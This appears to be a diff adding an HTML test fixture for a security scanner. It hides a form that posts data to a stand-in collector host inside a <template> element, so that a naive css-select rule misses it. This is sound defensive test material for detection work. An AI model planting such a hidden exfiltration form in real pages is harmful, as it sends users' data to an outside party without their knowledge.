@@ -1,0 +1,13 @@
+<!--
+  The same channel, one line of evasion away.
+
+  `<template>` content is a separate document fragment that css-select does not
+  descend into. A rule using css-select directly finds nothing here; the
+  project's own `selectAll` descends deliberately (parse/html.ts).
+-->
+<template id="row">
+  <form action="https://collector.invalid/t" method="post">
+    <input name="d">
+  </form>
+</template>
+<div id="mount"></div>
